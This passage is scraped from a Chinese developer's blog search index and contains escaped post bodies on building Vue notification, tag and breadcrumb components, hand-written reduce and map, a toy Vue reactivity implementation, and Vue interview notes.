&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1645441441775.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;要实现fixed定位的元素也要呈现有次序和有动画的出现和消失&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;如何实现&#34;&gt;如何实现&lt;/h2&gt;
&lt;p&gt;我们都知道上面的元素不过就是一个个实例的加入到页面中和到时间就移除，那么要怎么做到呢？&lt;/p&gt;
&lt;p&gt;首先准备好元素的&lt;code&gt;notification.vue&lt;/code&gt;组件文件，样式和动画我直接搬运ElementUI的，position默认右上角。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-vue&#34;&gt;&amp;lt;template&amp;gt;
 &amp;lt;transition name=&amp;quot;el-notification-fade&amp;quot;&amp;gt;
    &amp;lt;div 
    :class=&amp;quot;[&#39;el-notification&#39;,horizontalClass]&amp;quot; 
    v-show=&amp;quot;visible&amp;quot;
    :style=&amp;quot;positionstyle&amp;quot;&amp;gt;
    &amp;lt;div class=&amp;quot;el-notification__group&amp;quot;&amp;gt;
    &amp;lt;h2 class=&amp;quot;el-notification__title&amp;quot;&amp;gt;&amp;lt;/h2&amp;gt;
    &amp;lt;div class=&amp;quot;el-notification__content&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;
    &amp;lt;div :class=&amp;quot;[&#39;el-notification__closeBtn&#39;,{showClose:&#39;el-icon-close&#39;}]&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;
      {{title}}
  &amp;lt;/div&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;/transition&amp;gt;
&amp;lt;/template&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;当然，我们需要一个中心去管理所有实例，创建&lt;code&gt;main.js&lt;/code&gt;，引入我们的创建的组件。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;import Vue from &#39;vue&#39;
import notification from &#39;./main.vue&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Vue提供给我们&lt;code&gt;Vue.extend&lt;/code&gt;方法来创建一个子类&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;const  notificationconstructor=Vue.extend(notification)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;用数组来存储我们的实例&lt;code&gt;const instances=[]&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;因为最后我们是把&lt;code&gt;main.js&lt;/code&gt;挂载到Vue的原型链上，作为全局方法调用。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-vue&#34;&gt;Vue.prototype.$fannotify=notification
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;所以我们每次调用这个方法就需要去管理我们的实例&lt;/p&gt;
&lt;p&gt;调用&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;  this.$fannotify({
              title:&#39;fanfan&#39;,
              duration:4000
  })
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;const notify=((options)=&amp;gt;{
    ...见下
})

export default notify
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;对于传入参数进行处理赋值。&lt;/p&gt;
&lt;p&gt;通过new创建实例来传入方法和参数（简洁版）&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt; let instance=new notificationconstructor({
        propsData:options,
        data() {
            return {
                timer:null,
                visible:false
            }
        },
        mounted(){
           this.hanlestart()
       
        },

        beforeDestroy(){
            this.cleartime()
        },

        methods:{
            hanlestart(){
                this.timer=setTimeout(()=&amp;gt;{
                    this.handleclose()
                },duration)
            },
            handleclose(){
                this.visible=false
                /**要记得先获取高度 再remove */
                notify.removeInstance(instance)
                document.body.removeChild(this.$el)
            },

            cleartime(){
                clearTimeout(this.timer)
            }
        },
    })
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;给实例传入各种方法和参数后就需要挂载到body上面了。&lt;/p&gt;
&lt;p&gt;通过&lt;code&gt;Vue.$mount&lt;/code&gt;来手动挂载实例。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;如果 Vue 实例在实例化时没有收到 el 选项，则它处于“未挂载”状态，没有关联的 DOM 元素。可以使用 &lt;code&gt;vm.$mount()&lt;/code&gt; 手动地挂载一个未挂载的实例&lt;/p&gt;
&lt;p&gt;如果没有提供 &lt;code&gt;elementOrSelector&lt;/code&gt; 参数，模板将被渲染为文档之外的的元素，并且你必须使用原生 DOM API 把它插入文档中。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;所以我们用原生DOM方式插入这个实例&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;  4instance.id=id++
  instance = instance.$mount()
  document.body.appendChild(instance.$el)
  instance.visible=true
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这样这个元素就能正常的插入Body里面且能正常的消失了&lt;/p&gt;
&lt;p&gt;但并没有高度差和消失的一个个消失的动画效果，那么要如何实现统一管理呢？&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;实例统一管理&#34;&gt;实例统一管理&lt;/h2&gt;
&lt;p&gt;对于每个元素的生成和消失，我们都应该触发对应的方法来改变这个元素的&lt;code&gt;top&lt;/code&gt;位置，&lt;/p&gt;
&lt;p&gt;对于每个进来的元素&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt; //高度差 暂时不考虑自己传个offset进来
    let verticalOffset =0;

    instances.forEach((item)=&amp;gt;{
        verticalOffset+=item.$el.offsetHeight+16
    })
    verticalOffset += 16;
    instance.verticalOffset=verticalOffset

    instances.push(instance)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;计算好这个新元素应该具有的高度再push进数组中&lt;/p&gt;
&lt;p&gt;而对应每个remove的元素我们调用对应的remove方法&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;/**每个实例的消失 其余的top都要改变 */
notify.removeInstance=function(instance){
    //要从数组移除这个元素 且修改数组所有元素的top值 看起来就像被挤掉一样
    let len=instances.length

    let index=instances.findIndex(item=&amp;gt;item.id==instance.id)
    console.log(index);

    /**获取实例的高度 */
    let instanceHeight=instance.$el.offsetHeight
    console.log(instanceHeight);
    instances.splice(index,1)

    if(len&amp;lt;1) return 
    for (let i = index; i &amp;lt; len - 1; i++) {
        instances[i].verticalOffset = parseInt(instances[i].verticalOffset) - instanceHeight - 16
    }

}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这样产生的距离感就让我们看起来很有顺序一样的出现和消失。&lt;/p&gt;
">Vue实现notification组件</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/tag-zu-jian-kai-fa-ji-lu/"" data-c="
          &lt;h2 id=&#34;组件构成&#34;&gt;组件构成&lt;/h2&gt;
&lt;h3 id=&#34;tag&#34;&gt;&lt;code&gt;tag&lt;/code&gt;&lt;/h3&gt;
&lt;p&gt;饿了吗官方是jsx写法，不会写，用vue提供的render函数写会编译更加快，但写起来没那么好理解。&lt;/p&gt;
&lt;p&gt;依旧使用&lt;code&gt;templete&lt;/code&gt;模板编写，这样的总体难度偏低&lt;/p&gt;
&lt;p&gt;&lt;code&gt;tag&lt;/code&gt;提供两个事件&lt;/p&gt;
&lt;p&gt;&lt;code&gt;@close&lt;/code&gt;和&lt;code&gt;@click&lt;/code&gt;事件&lt;/p&gt;
&lt;p&gt;在组件中就要进行事件注册和回调&lt;/p&gt;
&lt;p&gt;&lt;code&gt;this.$emit(&#39;close&#39;,event)&lt;/code&gt;&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;代码&#34;&gt;代码&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;&amp;lt;template&amp;gt;
 &amp;lt;transition name=&amp;quot;el-zoom-in-center&amp;quot;&amp;gt;
    &amp;lt;span
  class=&#39;el-tag &#39;
  :class=&amp;quot;[
      this.type?`el-tag--${type}`:&#39;&#39;,
      `el-tag--${effect}`
  ]&amp;quot;&amp;gt;
      &amp;lt;slot&amp;gt;&amp;lt;/slot&amp;gt;
      &amp;lt;i 
      @click=&amp;quot;handleclose&amp;quot;
      v-show=&amp;quot;closable&amp;quot;
      class=&#39;el-tag__close el-icon-close&#39;&amp;gt; 

      &amp;lt;/i&amp;gt;
  &amp;lt;/span&amp;gt;
 &amp;lt;/transition&amp;gt;
&amp;lt;/template&amp;gt;
&amp;lt;script&amp;gt;
export default {
  name: &amp;quot;FanTag&amp;quot;,
  props: {
    closable: {
      type: Boolean,
      default: false,
    },

    type: String,
    size: String,

    effect:{
      type:String,
      default:&#39;light&#39;
    }
  },

  methods:{
    handleclose(event){
      console.log(event);
        event.stopPropagation();
        this.$emit(&#39;close&#39;, event);
    }
  }
};
&amp;lt;/script&amp;gt;

&amp;lt;style&amp;gt;
&amp;lt;/style&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
">Tag组件开发记录</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/breadcrumb-zu-jian-kai-fa-ji-lu/"" data-c="
          &lt;h2 id=&#34;组件构成&#34;&gt;组件构成&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;breadcrumb&lt;/code&gt;和&lt;code&gt;breadcrumb-item&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;所以需要两个组件文件进行全局注册。&lt;/p&gt;
&lt;h3 id=&#34;breadcrumb&#34;&gt;&lt;code&gt;breadcrumb&lt;/code&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;用法&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;fan-breadcrumb separator=&amp;quot;/&amp;quot;&amp;gt;
	...
&amp;lt;/fan-breadcrumb&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;props只有一个属性&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;  props:{
        separator:{
            type:String,
            default:&#39;/&#39;
        }
    },
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;因为子组件需要这个属性，所以要给子组件传递这个参数。&lt;/p&gt;
&lt;p&gt;可以采用&lt;code&gt;provide/inject&lt;/code&gt;对子组件进行注册传递参数&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;	//breadcrumb
    //命名 直接返回这个对象
    provide(){
        return{
            breadcrumbVm:this
        }
    }
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;//breadcrumb-item
 //依赖注入
    inject:[&#39;breadcrumbVm&#39;],     
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;总代码&#34;&gt;总代码&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;template&amp;gt;
  &amp;lt;div class=&amp;quot;breadcrumb&amp;quot;&amp;gt;
    &amp;lt;slot&amp;gt;&amp;lt;/slot&amp;gt;
  &amp;lt;/div&amp;gt;
&amp;lt;/template&amp;gt;

&amp;lt;script&amp;gt;
export default {
    name:&#39;FanBreadcrumb&#39;,
    props:{
        separator:{
            type:String,
            default:&#39;/&#39;
        }
    },

    //命名 直接返回这个对象
    provide(){
        return{
            breadcrumbVm:this
        }
    }


}
&amp;lt;/script&amp;gt;

&amp;lt;style&amp;gt;
    /**处理最后一个也有样式的问题*/
.breadcrumb .breadcrumb-item:last-child .breadcrumb-separator{
        display: none;
}
&amp;lt;/style&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;breadcrumb-item&#34;&gt;&lt;code&gt;breadcrumb-item&lt;/code&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;用法：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;fan-breadcrumb separator=&amp;quot;/&amp;quot;&amp;gt;
	&amp;lt;fan-breadcrumb-item :to=&amp;quot;{ path: &#39;/&#39; }&amp;quot;&amp;gt;
		
	&amp;lt;/fan-breadcrumb-item&amp;gt;
&amp;lt;/fan-breadcrumb&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;需要接收&lt;code&gt;to&lt;/code&gt;属性，带有这个属性的组件会有被选中的颜色区别&lt;/p&gt;
&lt;p&gt;用&lt;code&gt;inject&lt;/code&gt;来接收&lt;code&gt;provide&lt;/code&gt;注入的内容&lt;/p&gt;
&lt;p&gt;&lt;code&gt;inject:[&#39;breadcrumbVm&#39;]&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;总代码-2&#34;&gt;总代码&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;template&amp;gt;
&amp;lt;span class=&amp;quot;breadcrumb-item&amp;quot;&amp;gt;
     &amp;lt;span :class=&amp;quot;[&#39;baselink&#39;,{&#39;is-link&#39;:to.path}]&amp;quot;
     @click=&amp;quot;handlepath&amp;quot;&amp;gt;
         &amp;lt;slot&amp;gt;&amp;lt;/slot&amp;gt;
    &amp;lt;/span&amp;gt;

&amp;lt;span class=&amp;quot;breadcrumb-separator&amp;quot;&amp;gt;{{separator}}&amp;lt;/span&amp;gt;
&amp;lt;/span&amp;gt;
&amp;lt;/template&amp;gt;

&amp;lt;script&amp;gt;
export default {
    name:&#39;FanBreadcrumbItem&#39;,
    props:{
        to:{
            type:Object,
            default:()=&amp;gt;({})
        }
    },
    data() {
        return {
            separator:&#39;&#39;
        }
    },
    methods:{
        handlepath(){
            const {$router ,to}=this
            if(!to.path) return
            console.log(to.path);
            if($router) $router.push(to.path)
        }
    },
    //依赖注入
    inject:[&#39;breadcrumbVm&#39;],

    mounted(){
        console.log(this.breadcrumbVm.separator);
       this.separator=this.breadcrumbVm.separator
    },


}
&amp;lt;/script&amp;gt;

&amp;lt;style&amp;gt;
.breadcrumb-separator{
      margin: 0 9px;
    font-weight: 700;
    color: #c0c4cc;
}

/**基本样式 */
.baselink{
        color: #606266;
}

.is-link{
    cursor: pointer;
    font-weight: 700;
    text-decoration: none;
    transition: color .2s cubic-bezier(.645,.045,.355,1);
    color: #303133;
}
.is-link:hover{
    color: rgb(184, 184, 197);
}
  
&amp;lt;/style&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
"> Breadcrumb组件开发记录</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/shou-xie-shi-xian-reducemap/"" data-c="
          &lt;p&gt;reduce的参数为&lt;code&gt;((pre,cur,index,array)=&amp;gt;{},base)&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;//reduce 方法  
    //函数 初始值
    Array.prototype.myreduce=function (fn,base){
        let myarr=this
        //数组副本
        let temparr=this.concat()
        //如果存在默认值需要把默认值推入数组第一位
        if(base) temparr.unshift(base)

        //记录下标和两者和 
        let index 
        let newvalue

        while(temparr.length&amp;gt;1){
            index=myarr.length-temparr.length+1
            newvalue=fn.call(null,temparr[0],temparr[1],index,myarr)
            //去掉两项，并且把二者的结果插入第一项
            temparr.splice(0,2,newvalue)
        }

        return newvalue
    }

    let  arr=[1,2,3,4]

    arr.myreduce((pre,cur,index,arrry)=&amp;gt;{
        console.log(pre);
        return pre+cur+1
    },20)
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;p&gt;map会对返回对数组进行操作后的结果&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;//map方法 (cur,index,array)=&amp;gt;{}
    let arr2=[1,2,3,4]
    Array.prototype.mymap=function(fn){

        let resultarr=[]

        this.forEach((v,i)=&amp;gt;{
            resultarr.push(fn(v,i,this))
        })

        return resultarr
    }

    let res=arr2.mymap((v,i)=&amp;gt;{
        console.log(i);
        return v*v
    })
    console.log(res);
&lt;/code&gt;&lt;/pre&gt;
">手写实现reduce、map</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/vue-xiang-ying-shi-guo-cheng/"" data-c="
          &lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html lang=&amp;quot;en&amp;quot;&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt;
    &amp;lt;meta http-equiv=&amp;quot;X-UA-Compatible&amp;quot; content=&amp;quot;IE=edge&amp;quot;&amp;gt;
    &amp;lt;meta name=&amp;quot;viewport&amp;quot; content=&amp;quot;width=device-width, initial-scale=1.0&amp;quot;&amp;gt;
    &amp;lt;title&amp;gt;Document&amp;lt;/title&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
    &amp;lt;div id=&amp;quot;app&amp;quot;&amp;gt;
        &amp;lt;input v-model=&amp;quot;fanfan&amp;quot;&amp;gt;{{fanfan}} 
        
    &amp;lt;/div&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&amp;lt;script&amp;gt;
    function mycompile(el,vm) {
        //传入节点
        let node=el
        //进行子节点处理
        this.frag=this.nodefragment(node,vm)

        return this.frag

    }


    mycompile.prototype.nodefragment=function(node,vm){
        let flag=document.createDocumentFragment()
        let child

        while (child=node.firstChild) {
             

                //对每个子节点的input和{{}}进行识别
                this.compileElement(child,vm)
                //对于嵌套的进行递归
                if(child.firstChild){
               
                   flag.append(this.nodefragment(child,vm)) 
                }

                flag.append(child)
        }

        return flag
    }

    mycompile.prototype.compileElement=function(node,vm){

        var reg = /\{\{(.*)\}\}/;

      
        if(node.nodeType == 1) {
                    var attr = node.attributes;
                    // 解析属性
                    for(var i = 0; i &amp;lt; attr.length; i++ ) {
                        if(attr[i].nodeName == &#39;v-model&#39;) {
                            var name = attr[i].nodeValue; // 获取v-model绑定的属性名
                            
                            node.addEventListener(&#39;input&#39;, function(e) {
                                // 给相应的data属性赋值，进而触发该属性的set方法
                                vm[name]=e.target.value
                                console.log(e.target.value);
                              
                            });
                            // node.value = vm[name]; // 将data的值赋给该node
                            new Watch(vm, node, name, &#39;value&#39;);

                        }
                    }
                }

            if(node.nodeType==3) //文本节点
            {
                if(reg.test(node.nodeValue)){
                    //key值
                    let name=RegExp.$1
                    //识别出来后进行data值的替换
                    node.nodeValue=vm[name]
                    //要进行双向绑定的联系 让vm里面值改变的时候也通知{{}}改变 通过watch进行收集 dep进行订阅 到时候改变就会dep进行发布
                    new Watch(vm,node,name,&#39;nodeValue&#39;)
                }      
            }
    }
   
    //对于vue对象 需要进行data的响应式绑定和dom树的模板解析
   function myvue(options){
        this.data=options.data
        this.el=options.el
        observer(this.data,this)
        let dom= new mycompile(document.getElementById(this.el),this)
        document.getElementById(this.el).appendChild(dom);
   }

   function observer(obj,vm){
        Object.keys(obj).forEach((v)=&amp;gt;{
            
            defineReactive(vm,v,obj[v])

        })
   }

   function defineReactive(obj,key,value){
        var dep = new Dep();

        //如果是对象的话 还要进行递归响应式 并且将其挂载在对应的对象上
        if(  Object.prototype.toString.call(value)==&#39;[object Object]&#39;){
                observer(value,value)
        }

        Object.defineProperty(obj,key,{
             get: function() {
                 console.log(&#39;get&#39;);
                    //添加订阅者watcher到主题对象Dep
                    if(Dep.target) {
                        console.log(&#39;推入&#39;);
                        console.log(Dep.target);
                        // JS的浏览器单线程特性，保证这个全局变量在同一时间内，只会有同一个监听器使用
                        dep.depend(Dep.target);
                    }
                    //返回后作为vue实例上的属性
                   return value; 
                },

            set:function(newvalue){
                console.log(&#39;set&#39;);
               
                if(newvalue === value) return;
                    value = newvalue;
                        // 作为发布者发出通知
                        dep.notify();
                }  
        })
   }


   function Watch(vm,node,name,type){

            Dep.target=this
            this.vm=vm
            this.node=node
            this.name=name
            this.type=type
            //触发更新
            this.update()
            Dep.target=null

   }
   Watch.prototype.update=function(){
    //触发vm的get函数 把这个watch推入观察者 ！！！
    this.node[this.type]=this.vm[this.name]
   }

   function Dep(){

    this.subscribes=[]

   }
   
    Dep.prototype.depend=function(dep){
        this.subscribes.push(dep)
    }

    Dep.prototype.notify=function(dep){
        this.subscribes.forEach((sub)=&amp;gt;{
            sub.update()
        })
    }

 

   let vm=new myvue({
       el:&#39;app&#39;,
       data:{
            fanfan:&#39;挂载fan&#39;,
            xixi:&#39;我&#39;,
            myobj:{
                one:&#39;1&#39;,
                two:&#39;2&#39;
            },
       },
      
   })

&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;通过监听DOM里面的input的键入操作，如果有v-model的属性就会改变vm对象中对应的属性值。触发set操作。&lt;/p&gt;
&lt;p&gt;然后通知Dep去更改视图。&lt;/p&gt;
"> Vue响应式过程</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/vue-mian-shi-ti/"" data-c="
          &lt;h3 id=&#34;vue是完全的mvvm模型吗&#34;&gt;&lt;strong&gt;Vue是完全的MVVM模型吗？&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;严格的MVVVM要求View不能和Model直接通信，而Vue提供了$refs这个属性，让Model可以直接操作View，违反了这一规定，所以是Vue没有完全遵循MVVM。&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;vue的单项数据流&#34;&gt;&lt;strong&gt;Vue的单项数据流&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;所有的 prop 都使得其父子 prop 之间形成了一个单向下行绑定：父&lt;strong&gt;级 prop 的更新会向下流动到子组件中，但是反过来则不行&lt;/strong&gt;。这样会防止从子组件意外改变父级组件的状态，从而导致你的应用的数据流向难以理解。&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;vue的父子组件生命周期钩子函数执行顺序&#34;&gt;&lt;strong&gt;Vue的父子组件生命周期钩子函数执行顺序&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;加载渲染过程&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;父beforeCreate -&amp;gt; 父created -&amp;gt; 父beforeMount -&amp;gt; 子beforeCreate -&amp;gt; 子created -&amp;gt; 子beforeMount -&amp;gt; 子mounted -&amp;gt; 父mounted&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;子组件更新过程&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;父beforeUpdate -&amp;gt; 子beforeUpdate -&amp;gt; 子updated -&amp;gt; 父updated&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;父组件更新过程&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;父beforeUpdate -&amp;gt; 父updated&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;销毁过程&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;父beforeDestroy -&amp;gt; 子beforeDestroy -&amp;gt; 子destroyed -&amp;gt; 父destroyed&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h3 id=&#34;mvc和mvvm区别&#34;&gt;&lt;strong&gt;MVC和MVVM区别&lt;/strong&gt;&lt;/h3&gt;
&lt;h4 id=&#34;mvc&#34;&gt;MVC&lt;/h4&gt;
&lt;p&gt;MVC是model view controller&lt;/p&gt;
&lt;img src=&#34;https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy90dFZXdXJMb0dWaWFkeUV6WllDRWlhbXIxSWhKaWNlMUpGUXlCaEQ1Q2RQSHA0RllnRXVVVGVaRDk0RzdKYUNHS3BYNGhpYTdibm1rcU9Fbk5FcEppYUhCaWJSUS82NDA?x-oss-process=image/format,png#pic_center&#34;&gt;
&lt;p&gt;&lt;strong&gt;MVC的思想&lt;/strong&gt;：Controller负责将Model的数据用View显示出来，换句话说就是在Controller里面把Model的数据赋值给View。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;MVC的特点&lt;/strong&gt;：实现关注点分离，即应用程序中的数据模型与业务和展示逻辑解耦。就是将模型和视图之间实现代码分离，松散耦合，使之成为一个更容易开发、维护和测试的客户端应用程序。&lt;/p&gt;
&lt;p&gt;一般用于中大型项目开发。&lt;/p&gt;
&lt;h4 id=&#34;mvvm&#34;&gt;MVVM&lt;/h4&gt;
&lt;p&gt;MVVM是Model-View-ViewModel的简写，即模型-视图-视图模型。&lt;/p&gt;
&lt;img src=&#34;https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy90dFZXdXJMb0dWaWFkeUV6WllDRWlhbXIxSWhKaWNlMUpGUW9CN2M3QjlDZ0NQSDIzYVV4QjBnNzI5WkNVMERWbnBJZEh3Mzl0aWJWNlJJdWpwdEFET1VIaWJnLzY0MA?x-oss-process=image/format,png#pic_center&#34;&gt;
&lt;p&gt;它有两个方向：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;一是将模型转化成视图，即将后端传递的数据转化成所看到的页面。实现的方式是：数据绑定。&lt;/li&gt;
&lt;li&gt;二是将视图转化成模型，即将所看到的页面转化成后端的数据。实现的方式是：DOM 事件监听。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这两个方向都实现的，就是数据的双向绑定。&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;diff算法&#34;&gt;&lt;strong&gt;diff算法&lt;/strong&gt;&lt;/h3&gt;
&lt;img src=&#34;https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/9e3c68d1b0884d9ca0f8ffc5ee64a28e~tplv-k3u1fbpfcp-watermark.image&#34;&gt;
&lt;br&gt;
&lt;h3 id=&#34;双向绑定&#34;&gt;&lt;strong&gt;双向绑定&lt;/strong&gt;&lt;/h3&gt;
&lt;br&gt;
&lt;p&gt;&lt;a href=&#34;https://www.jianshu.com/p/60d9452f8c52&#34;&gt;详解&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&#34;什么是双向绑定&#34;&gt;什么是双向绑定&lt;/h4&gt;
&lt;p&gt;单项绑定就是通过Model去改变view。&lt;/p&gt;
&lt;p&gt;当实现用户更新view，model的数据也自动被更新就实现了双向绑定。&lt;/p&gt;
&lt;p&gt;例如当用户填写表单时候改变了view，Model的数据也被自动更新了，这就实现了双向绑定。&lt;/p&gt;
&lt;br&gt;
&lt;h4 id=&#34;双向绑定原理&#34;&gt;双向绑定原理&lt;/h4&gt;
&lt;img src=&#34;https://img.bosszhipin.com/beijin/cms/6c155f92bf101d7f3474c8db1dc5a5f2ceb4162adcce9c8ed358cb008b64ac2a92d08620afbe4bc5b07a8d61e4550181.png?x-oss-process=image/quality,q_60&#34;&gt;
&lt;p&gt;vue采用的是 &lt;strong&gt;数据劫持&lt;/strong&gt;结合 &lt;strong&gt;发布-订阅模式&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;通过ES5的 &lt;code&gt;Object.defineProperty()&lt;/code&gt;的&lt;code&gt;get&lt;/code&gt;和&lt;code&gt;set&lt;/code&gt;来进行数据的劫持。&lt;/p&gt;
&lt;p&gt;1.实现一个监听器Observer，用来劫持并监听所有属性，如果有变动的，就通知订阅者。&lt;/p&gt;
&lt;p&gt;2.实现一个订阅者Watcher，可以收到属性的变化通知并执行相应的函数，从而更新视图。&lt;/p&gt;
&lt;p&gt;3.实现一个解析器Compile，可以扫描和解析每个节点的相关指令，并根据初始化模板数据以及初始化相应的订阅器。&lt;/p&gt;
&lt;p&gt;需要自己动手实现代码&lt;/p&gt;
&lt;p&gt;现在复述下实现过程&lt;/p&gt;
&lt;p&gt;observe 作为一个收集者，将watch全收集起来，当发生改变的时候，会通过属性的set去notify。watch主要是对这个vue实例模板节点进行订阅后存进observe。存的包括这个节点、节点类型、节点value。每次初始化watch就会将将碰到的这个模板节点进行存放，调用这个属性的Obejct.defineProperty的&lt;code&gt;get&lt;/code&gt;方法，然后进行DeP的存放。每次这个值就行更改就会调用set方法，然后再把所有watch进行执行。&lt;/p&gt;
&lt;br&gt;
&lt;br&gt;
&lt;h2 id=&#34;vuex&#34;&gt;vuex&lt;/h2&gt;
&lt;p&gt;vuex是为专门开发的状态管理模式。采用集中式存储管理所有组件的状态。&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;出现原因&#34;&gt;出现原因&lt;/h3&gt;
&lt;p&gt;vue一般是单项数据流，当我们的应用遇到多个组件共享状态时，单向数据流的简洁性很容易被破坏：&lt;br&gt;
多个视图依赖于同一状态、来自不同视图的行为需要变更同一状态。&lt;/p&gt;
&lt;p&gt;作用：多个组件共享数据或者是跨组件传递数据&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;使用&#34;&gt;使用&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// store.js
1.引入Vuex插件；
Vue.use(Vuex);

2.将Vuex.Store这个类实例化，并传入一些配置
const store = new Vuex.Store({
    state:{
        count:0
    },
    mutations:{
        increment(state){
            state.count++;
        },
        del(state){
            state.count--;
        },
    },
    actions:{
        asyncAdd({commit}){
            setTimeout(() =&amp;gt; {
                commit(&amp;quot;increment&amp;quot;);
            }, 2000);
        }
    }
})

3.将store的实例配置给Vue
// main.js
new Vue({
  store,
  render: h =&amp;gt; h(App),
}).$mount(&#39;#app&#39;)


